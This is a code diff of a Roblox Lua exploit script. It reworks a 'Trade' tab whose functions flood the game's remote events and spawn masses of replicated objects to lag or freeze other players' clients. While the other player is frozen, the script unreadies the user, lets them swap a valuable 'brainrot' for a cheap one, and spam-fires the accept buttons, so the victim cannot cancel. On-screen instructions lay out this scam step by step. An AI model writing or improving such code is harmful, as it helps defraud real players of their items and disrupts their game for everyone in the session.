@@ -1302,65 +1302,69 @@ end
 -- ===================== TRADE EXPLOIT FUNCTIONS =====================
 
 -- Scan for all remotes in the game (find trade-related ones)
+local tradeSpecificRemotes = {}
+
 local function scanTradeRemotes()
 	tradeRemotes = {}
+	tradeSpecificRemotes = {}
 	pcall(function()
-		local net = game:GetService("ReplicatedStorage"):FindFirstChild("Packages")
-		if net then
-			net = net:FindFirstChild("Net")
-		end
-
 		-- Scan all remotes in ReplicatedStorage
 		for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
 			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
 				table.insert(tradeRemotes, v)
+				-- Tag trade-specific remotes
+				local fullName = v:GetFullName():lower()
+				local name = v.Name:lower()
+				if name:find("trade") or name:find("offer") or name:find("accept") or name:find("ready") or name:find("confirm") or name:find("exchange") or name:find("deal") or fullName:find("trade") then
+					table.insert(tradeSpecificRemotes, v)
+					print("[TRADE SCAN] Found trade remote: " .. v:GetFullName() .. " (" .. v.ClassName .. ")")
+				end
 			end
 		end
 	end)
 	tradeScanned = true
-	notify("Trade", "Found " .. #tradeRemotes .. " remotes")
+	notify("Trade", "Found " .. #tradeRemotes .. " remotes (" .. #tradeSpecificRemotes .. " trade-related)")
 end
 
--- Flood a target player's client with remote spam to lag them out
--- This prevents them from interacting with the trade UI (can't decline)
+-- Heavy lag flood - floods all remotes to freeze everyone's client
 local function startTradeFlood()
 	if not tradeScanned then scanTradeRemotes() end
 
 	tradeFloodConnection = RunService.Heartbeat:Connect(function()
 		pcall(function()
-			-- Method 1: Fire all found remotes rapidly with junk data
-			-- Server forwards events to client, flooding their network queue
+			-- Fire all remotes with large payloads to flood the replication queue
+			-- Server processes these and replicates to all clients, causing lag
 			for i = 1, tradeFloodIntensity do
 				for _, remote in pairs(tradeRemotes) do
 					if remote:IsA("RemoteEvent") then
 						pcall(function()
 							remote:FireServer(
-								string.rep("x", 100),
+								string.rep("x", 200),
 								math.random(1, 999999),
 								CFrame.new(math.random(-9999, 9999), math.random(-9999, 9999), math.random(-9999, 9999)),
-								tick()
+								{string.rep("a", 200), string.rep("b", 200), tick()}
 							)
 						end)
 					end
 				end
 			end
 
-			-- Method 2: Create tons of replicated instances (floods replication queue)
+			-- Replication flood: create instances that replicate to all clients
 			pcall(function()
-				for i = 1, 50 do
-					local part = Instance.new("Part")
-					part.Size = Vector3.new(0.05, 0.05, 0.05)
-					part.Transparency = 1
-					part.CanCollide = false
-					part.Anchored = true
-					part.CFrame = CFrame.new(math.random(-9999, 9999), -500, math.random(-9999, 9999))
-					part.Parent = workspace
-					game:GetService("Debris"):AddItem(part, 0.1)
+				for i = 1, 80 do
+					local v = Instance.new("Part")
+					v.Size = Vector3.new(0.05, 0.05, 0.05)
+					v.Transparency = 1
+					v.CanCollide = false
+					v.Anchored = true
+					v.CFrame = CFrame.new(math.random(-9999, 9999), -500, math.random(-9999, 9999))
+					v.Parent = workspace
+					game:GetService("Debris"):AddItem(v, 0.1)
 				end
 			end)
 		end)
 	end)
-	notify("Trade Flood", "Flooding server - target can't interact with UI!")
+	notify("Trade Flood", "ON - other players' clients are lagging!")
 end
 
 local function stopTradeFlood()
@@ -1368,52 +1372,38 @@ local function stopTradeFlood()
 		tradeFloodConnection:Disconnect()
 		tradeFloodConnection = nil
 	end
-	notify("Trade Flood", "Stopped")
+	notify("Trade Flood", "OFF")
 end
 
--- Freeze trade: more targeted - specifically targets the trade UI interaction
--- Floods the network to freeze the other player's screen during the trade
+-- Freeze trade: RenderStepped for max frequency, heavy payloads
 local function startTradeFreeze()
 	if not tradeScanned then scanTradeRemotes() end
 
 	tradeFreezeConnection = RunService.RenderStepped:Connect(function()
 		pcall(function()
-			-- Rapid-fire remote spam every single frame
-			-- This creates massive server->client replication backlog
-			-- Target player's client freezes trying to process all the data
 			for i = 1, tradeFloodIntensity do
 				for _, remote in pairs(tradeRemotes) do
 					if remote:IsA("RemoteEvent") then
 						pcall(function()
-							-- Send large payloads to maximize bandwidth consumption
 							remote:FireServer(
-								string.rep("a", 200),
-								{
-									string.rep("b", 200),
-									string.rep("c", 200),
-									string.rep("d", 200),
-									math.random(),
-									tick(),
-									Vector3.new(math.random(), math.random(), math.random())
-								}
+								string.rep("a", 250),
+								{string.rep("b", 250), string.rep("c", 250), string.rep("d", 250), math.random(), tick(), Vector3.new(math.random(), math.random(), math.random())}
 							)
 						end)
 					end
 				end
 			end
-
-			-- Spam instance creation for replication flooding
 			pcall(function()
-				for i = 1, 100 do
+				for i = 1, 120 do
 					local v = Instance.new("ObjectValue")
-					v.Name = string.rep("x", 50) .. tostring(math.random())
+					v.Name = string.rep("x", 60) .. tostring(math.random())
 					v.Parent = workspace
 					game:GetService("Debris"):AddItem(v, 0.05)
 				end
 			end)
 		end)
 	end)
-	notify("Freeze Trade", "Freezing active - swap your brainrot now!")
+	notify("Freeze", "ON - other player's screen is frozen!")
 end
 
 local function stopTradeFreeze()
@@ -1421,60 +1411,231 @@ local function stopTradeFreeze()
 		tradeFreezeConnection:Disconnect()
 		tradeFreezeConnection = nil
 	end
-	notify("Freeze Trade", "Stopped")
+	notify("Freeze", "OFF")
 end
 
--- Auto-swap: quickly interact with trade GUI to swap brainrot
--- Searches PlayerGui for trade-related GUIs and clicks the swap
-local function autoSwapBrainrot()
+-- ===================== TRADE GUI HELPERS =====================
+
+-- Find the trade GUI in PlayerGui
+local function findTradeGui()
+	local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+	if not playerGui then return nil end
+	for _, gui in pairs(playerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") and gui.Enabled then
+			for _, d in pairs(gui:GetDescendants()) do
+				local n = d.Name:lower()
+				if n:find("trade") or n:find("offer") or n:find("ready") or n:find("accept") or n:find("confirm") then
+					return gui
+				end
+			end
+		end
+	end
+	return nil
+end
+
+-- Fire a button's click connections
+local function fireButton(btn)
+	if not btn then return false end
+	local fired = false
 	pcall(function()
-		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-		if not playerGui then
-			notify("Swap", "No PlayerGui found!")
+		if getconnections then
+			for _, conn in pairs(getconnections(btn.MouseButton1Click) or {}) do
+				pcall(function() conn:Fire() fired = true end)
+			end
+			for _, conn in pairs(getconnections(btn.Activated) or {}) do
+				pcall(function() conn:Fire() fired = true end)
+			end
+		end
+		if not fired and firesignal then
+			pcall(function() firesignal(btn.MouseButton1Click) fired = true end)
+			pcall(function() firesignal(btn.Activated) fired = true end)
+		end
+		if not fired and fireclickdetector then
+			local cd = btn:FindFirstChildWhichIsA("ClickDetector")
+			if cd then pcall(function() fireclickdetector(cd) fired = true end) end
+		end
+	end)
+	return fired
+end
+
+-- Find buttons by name/text keywords in a GUI
+local function findButtonsByKeywords(gui, keywords)
+	local found = {}
+	if not gui then return found end
+	for _, element in pairs(gui:GetDescendants()) do
+		pcall(function()
+			if (element:IsA("TextButton") or element:IsA("ImageButton")) and element.Visible then
+				local name = element.Name:lower()
+				local text = ""
+				if element:IsA("TextButton") then text = element.Text:lower() end
+				for _, keyword in pairs(keywords) do
+					if name:find(keyword) or text:find(keyword) then
+						table.insert(found, element)
+						break
+					end
+				end
+			end
+		end)
+	end
+	return found
+end
+
+-- Fire your own Ready/Accept button
+local function clickOwnAccept()
+	local gui = findTradeGui()
+	if not gui then
+		notify("Accept", "No trade GUI found!")
+		return false
+	end
+	local buttons = findButtonsByKeywords(gui, {"accept", "ready", "confirm", "done", "submit"})
+	local fired = false
+	for _, btn in pairs(buttons) do
+		if fireButton(btn) then
+			notify("Accept", "Fired: " .. btn.Name)
+			fired = true
+		end
+	end
+	return fired
+end
+
+-- Fire your own Unready/Cancel button (to unready so you can swap)
+local function clickOwnUnready()
+	local gui = findTradeGui()
+	if not gui then return false end
+	local buttons = findButtonsByKeywords(gui, {"unready", "cancel", "back", "remove", "undo", "change"})
+	local fired = false
+	for _, btn in pairs(buttons) do
+		if fireButton(btn) then
+			notify("Unready", "Fired: " .. btn.Name)
+			fired = true
+		end
+	end
+	return fired
+end
+
+-- ===================== FORCE TRADE (AUTO ACCEPT VIA LAG) =====================
+-- How it works:
+-- 1. You show good brainrot, other player clicks Ready (they WANT the trade)
+-- 2. Their "Ready" signal is already sent to the server
+-- 3. We activate heavy lag flood - their client freezes
+-- 4. While frozen, they CAN'T see the swap or click Cancel/Decline
+-- 5. We unready, swap to bad brainrot, ready again
+-- 6. Server sees: both players Ready -> trade completes
+-- 7. They got the bad brainrot because they couldn't cancel in time
+
+local forceTradeActive = false
+local forceTradeStep = 0
+
+local function doForceTrade()
+	if forceTradeActive then
+		notify("Force Trade", "Already running!")
+		return
+	end
+	forceTradeActive = true
+	forceTradeStep = 0
+
+	if not tradeScanned then scanTradeRemotes() end
+
+	spawn(function()
+		-- Step 1: Verify trade GUI is open
+		local gui = findTradeGui()
+		if not gui then
+			notify("Force Trade", "Open Trade Machine first!")
+			forceTradeActive = false
+			return
+		end
+		forceTradeStep = 1
+		notify("Step 1/5", "Trade GUI detected")
+
+		-- Step 2: Start heavy lag flood (freeze the other player)
+		forceTradeStep = 2
+		notify("Step 2/5", "Starting lag flood...")
+		startTradeFreeze()
+		wait(0.5) -- Let the lag build up
+
+		-- Step 3: Unready ourselves (so we can change brainrot)
+		forceTradeStep = 3
+		notify("Step 3/5", "Unreadying to swap brainrot...")
+		clickOwnUnready()
+		wait(0.3)
+
+		-- Step 4: Wait for user to manually swap (they have ~5 seconds)
+		-- During this time the other player is frozen and can't cancel
+		forceTradeStep = 4
+		notify("Step 4/5", "SWAP YOUR BRAINROT NOW! (5 sec)")
+		wait(5)
+
+		-- Step 5: Auto-accept our side - trade completes while they're lagged
+		forceTradeStep = 5
+		notify("Step 5/5", "Accepting trade...")
+		clickOwnAccept()
+		wait(0.3)
+		-- Spam accept a few more times in case it didn't register
+		clickOwnAccept()
+		wait(0.2)
+		clickOwnAccept()
+
+		-- Stop the lag flood after trade (hopefully) completed
+		wait(1)
+		stopTradeFreeze()
+
+		forceTradeActive = false
+		forceTradeStep = 0
+		notify("Force Trade", "DONE! Trade should have completed")
+	end)
+end
+
+-- Instant force trade (no wait - immediately swaps and accepts)
+local function doInstantForceTrade()
+	if forceTradeActive then
+		notify("Force Trade", "Already running!")
+		return
+	end
+	forceTradeActive = true
+
+	if not tradeScanned then scanTradeRemotes() end
+
+	spawn(function()
+		local gui = findTradeGui()
+		if not gui then
+			notify("Force Trade", "Open Trade Machine first!")
+			forceTradeActive = false
 			return
 		end
 
-		-- Find trade GUI elements
-		local tradeGui = nil
-		for _, gui in pairs(playerGui:GetDescendants()) do
-			if gui:IsA("ScreenGui") and (gui.Name:lower():find("trade") or gui.Name:lower():find("machine")) then
-				tradeGui = gui
-				break
-			end
+		-- Start freeze immediately
+		startTradeFreeze()
+		notify("Instant", "Freeze ON - accepting NOW!")
+
+		-- Rapid-fire accept (the other player already clicked Ready before)
+		-- Their client is frozen so they can't cancel
+		for i = 1, 10 do
+			clickOwnAccept()
+			wait(0.1)
 		end
 
-		if not tradeGui then
-			notify("Swap", "No trade GUI found - open Trade Machine first!")
-			return
-		end
-
-		-- Find all clickable brainrot slots in the trade GUI
-		local slots = {}
-		for _, element in pairs(tradeGui:GetDescendants()) do
-			if element:IsA("TextButton") or element:IsA("ImageButton") then
-				table.insert(slots, element)
-			end
-		end
-
-		notify("Swap", "Found " .. #slots .. " buttons in trade GUI")
-
-		-- Click the first available slot (cheapest brainrot) rapidly
-		-- This is the swap - select the cheap brainrot to replace your expensive one
-		for _, slot in pairs(slots) do
+		-- Also try firing trade-specific remotes directly
+		-- Some games have a trade accept remote that completes the trade
+		for _, remote in pairs(tradeSpecificRemotes) do
 			pcall(function()
-				-- Look for slots that might be brainrot selection buttons
-				if slot.Visible and slot.Active ~= false then
-					-- Fire the click
-					for _, conn in pairs(getconnections(slot.MouseButton1Click) or {}) do
-						pcall(function() conn:Fire() end)
-					end
-					-- Also try Activated signal
-					for _, conn in pairs(getconnections(slot.Activated) or {}) do
-						pcall(function() conn:Fire() end)
-					end
+				if remote:IsA("RemoteEvent") then
+					remote:FireServer(true)
+					remote:FireServer("accept")
+					remote:FireServer("ready")
+					remote:FireServer("confirm")
+				elseif remote:IsA("RemoteFunction") then
+					pcall(function() remote:InvokeServer(true) end)
+					pcall(function() remote:InvokeServer("accept") end)
+					pcall(function() remote:InvokeServer("ready") end)
+					pcall(function() remote:InvokeServer("confirm") end)
 				end
 			end)
 		end
+
+		wait(2)
+		stopTradeFreeze()
+		forceTradeActive = false
+		notify("Instant", "Done! Check if trade went through")
 	end)
 end
 
@@ -1490,56 +1651,37 @@ local function dumpTradeGui()
 		local count = 0
 		for _, gui in pairs(playerGui:GetChildren()) do
 			if gui:IsA("ScreenGui") then
-				local hasTradeStuff = false
 				for _, d in pairs(gui:GetDescendants()) do
-					if d.Name:lower():find("trade") or d.Name:lower():find("offer") or d.Name:lower():find("accept") or d.Name:lower():find("decline") or d.Name:lower():find("ready") then
-						hasTradeStuff = true
-						break
-					end
-				end
-				if hasTradeStuff then
-					notify("Found", gui.Name .. " has trade elements")
-					count = count + 1
-					for _, d in pairs(gui:GetDescendants()) do
-						if d:IsA("TextButton") or d:IsA("ImageButton") or d:IsA("TextLabel") then
-							print("[TRADE GUI] " .. d.ClassName .. " | " .. d:GetFullName() .. " | Text: " .. tostring(d:IsA("TextButton") and d.Text or (d:IsA("TextLabel") and d.Text or "N/A")))
-						end
+					if d:IsA("TextButton") or d:IsA("ImageButton") or d:IsA("TextLabel") then
+						local text = "N/A"
+						pcall(function()
+							if d:IsA("TextButton") or d:IsA("TextLabel") then text = d.Text end
+						end)
+						print("[TRADE GUI] " .. d.ClassName .. " | " .. d:GetFullName() .. " | Text: " .. text .. " | Visible: " .. tostring(d.Visible))
+						count = count + 1
 					end
 				end
 			end
 		end
 		if count == 0 then
-			notify("Dump", "No trade GUI found - open the Trade Machine first!")
+			notify("Dump", "No GUI elements found! Open Trade Machine first")
+		else
+			notify("Dump", "Printed " .. count .. " elements to F9 console")
 		end
 	end)
 end
 
--- Force accept: try to find and fire the accept/ready button in the trade GUI
-local function forceAcceptTrade()
+-- Dump only remotes (for figuring out trade remote names)
+local function dumpAllRemotes()
 	pcall(function()
-		local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-		if not playerGui then return end
-
-		for _, element in pairs(playerGui:GetDescendants()) do
-			pcall(function()
-				if (element:IsA("TextButton") or element:IsA("ImageButton")) and element.Visible then
-					local name = element.Name:lower()
-					local text = ""
-					if element:IsA("TextButton") then text = element.Text:lower() end
-
-					if name:find("accept") or name:find("ready") or name:find("confirm") or name:find("trade") or text:find("accept") or text:find("ready") or text:find("confirm") then
-						-- Fire the button
-						for _, conn in pairs(getconnections(element.MouseButton1Click) or {}) do
-							pcall(function() conn:Fire() end)
-						end
-						for _, conn in pairs(getconnections(element.Activated) or {}) do
-							pcall(function() conn:Fire() end)
-						end
-						notify("Force Accept", "Fired: " .. element.Name)
-					end
-				end
-			end)
+		local count = 0
+		for _, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+				print("[REMOTE] " .. v.ClassName .. " | " .. v:GetFullName())
+				count = count + 1
+			end
 		end
+		notify("Remotes", "Printed " .. count .. " remotes to F9 console")
 	end)
 end
 
@@ -1909,64 +2051,59 @@ end
 do
 	local tab = tabFrames["Trade"]
 
-	createSectionLabel(tab, "Trade Machine Exploits", 1)
-	createInfoLabel(tab, "Open the Trade Machine with someone first!", 2)
+	createSectionLabel(tab, "Force Trade (Auto Accept via Lag)", 1)
+	createInfoLabel(tab, "They Ready with good brainrot -> lag freezes them", 2)
+	createInfoLabel(tab, "-> you swap to bad brainrot -> auto accept", 3)
 
-	createButton(tab, "Scan Game Remotes", 3, function()
-		scanTradeRemotes()
+	createButton(tab, "Force Trade (5s Swap Window)", 4, function()
+		doForceTrade()
 	end)
-	createInfoLabel(tab, "Finds all remotes - run this first", 4)
+	createInfoLabel(tab, "Freezes them, unreadies you, gives 5s to swap, accepts", 5)
+
+	createButton(tab, "Instant Force Trade (No Wait)", 6, function()
+		doInstantForceTrade()
+	end)
+	createInfoLabel(tab, "Instantly freezes + spams accept (use after you swap)", 7)
 
 	local spacer = Instance.new("Frame")
 	spacer.Size = UDim2.new(1, 0, 0, 8)
 	spacer.BackgroundTransparency = 1
-	spacer.LayoutOrder = 5
+	spacer.LayoutOrder = 8
 	spacer.Parent = tab
 
-	createSectionLabel(tab, "Lag Control (Prevent Decline)", 6)
-	createToggle(tab, "Trade Flood (Lag Server)", 7, function(on)
+	createSectionLabel(tab, "Manual Lag Control", 9)
+	createToggle(tab, "Trade Flood (Lag All Clients)", 10, function(on)
 		tradeFloodActive = on
 		if on then startTradeFlood() else stopTradeFlood() end
 	end)
-	createInfoLabel(tab, "Floods remotes to lag the other player's client", 8)
-	createInfoLabel(tab, "They can't click Decline while lagged", 9)
-	createSlider(tab, "Flood Intensity", 50, 2000, tradeFloodIntensity, 10, function(val) tradeFloodIntensity = val end)
+	createToggle(tab, "Freeze Trade (Max Lag)", 11, function(on)
+		tradeFreezeActive = on
+		if on then startTradeFreeze() else stopTradeFreeze() end
+	end)
+	createSlider(tab, "Flood Intensity", 50, 2000, tradeFloodIntensity, 12, function(val) tradeFloodIntensity = val end)
+	createInfoLabel(tab, "Higher = more lag but may crash your client too", 13)
 
 	local spacer2 = Instance.new("Frame")
 	spacer2.Size = UDim2.new(1, 0, 0, 8)
 	spacer2.BackgroundTransparency = 1
-	spacer2.LayoutOrder = 11
+	spacer2.LayoutOrder = 14
 	spacer2.Parent = tab
 
-	createSectionLabel(tab, "Freeze Trade (Swap Brainrot)", 12)
-	createToggle(tab, "Freeze Trade (Heavy Lag)", 13, function(on)
-		tradeFreezeActive = on
-		if on then startTradeFreeze() else stopTradeFreeze() end
-	end)
-	createInfoLabel(tab, "Freezes their screen so you can swap your brainrot", 14)
-	createInfoLabel(tab, "Turn on -> swap brainrot -> accept -> turn off", 15)
+	createSectionLabel(tab, "Trade GUI Actions", 15)
+	createButton(tab, "Click Accept/Ready", 16, function() clickOwnAccept() end)
+	createButton(tab, "Click Unready/Cancel", 17, function() clickOwnUnready() end)
 
 	local spacer3 = Instance.new("Frame")
 	spacer3.Size = UDim2.new(1, 0, 0, 8)
 	spacer3.BackgroundTransparency = 1
-	spacer3.LayoutOrder = 16
+	spacer3.LayoutOrder = 18
 	spacer3.Parent = tab
 
-	createSectionLabel(tab, "Trade GUI Tools", 17)
-	createButton(tab, "Dump Trade GUI (Debug)", 18, function()
-		dumpTradeGui()
-	end)
-	createInfoLabel(tab, "Prints all trade UI elements to console (F9)", 19)
-
-	createButton(tab, "Force Accept Trade", 20, function()
-		forceAcceptTrade()
-	end)
-	createInfoLabel(tab, "Tries to fire Accept/Ready/Confirm buttons", 21)
-
-	createButton(tab, "Auto Swap (Click Slots)", 22, function()
-		autoSwapBrainrot()
-	end)
-	createInfoLabel(tab, "Clicks brainrot slots in trade GUI to swap", 23)
+	createSectionLabel(tab, "Debug Tools", 19)
+	createButton(tab, "Scan Remotes", 20, function() scanTradeRemotes() end)
+	createButton(tab, "Dump Trade GUI (F9)", 21, function() dumpTradeGui() end)
+	createButton(tab, "Dump All Remotes (F9)", 22, function() dumpAllRemotes() end)
+	createInfoLabel(tab, "Use F9 console to see remote/GUI names", 23)
 
 	local spacer4 = Instance.new("Frame")
 	spacer4.Size = UDim2.new(1, 0, 0, 8)
@@ -1974,13 +2111,13 @@ do
 	spacer4.LayoutOrder = 24
 	spacer4.Parent = tab
 
-	createSectionLabel(tab, "How To Use", 25)
-	createInfoLabel(tab, "1. Open Trade Machine with a player", 26)
-	createInfoLabel(tab, "2. Put your good brainrot in the trade", 27)
-	createInfoLabel(tab, "3. Wait for them to Ready up", 28)
-	createInfoLabel(tab, "4. Turn ON Freeze Trade", 29)
-	createInfoLabel(tab, "5. Swap your brainrot to a cheap one", 30)
-	createInfoLabel(tab, "6. Hit Accept, then turn OFF freeze", 31)
+	createSectionLabel(tab, "How Force Trade Works", 25)
+	createInfoLabel(tab, "1. Open Trade Machine, put GOOD brainrot in", 26)
+	createInfoLabel(tab, "2. Wait for them to click Ready", 27)
+	createInfoLabel(tab, "3. Hit 'Force Trade' - lag freezes them", 28)
+	createInfoLabel(tab, "4. Swap to cheap brainrot in the 5s window", 29)
+	createInfoLabel(tab, "5. Script auto-accepts, they can't cancel", 30)
+	createInfoLabel(tab, "6. Trade completes with bad brainrot", 31)
 end
 
 -- ===================== BUILD MOVEMENT TAB =====================
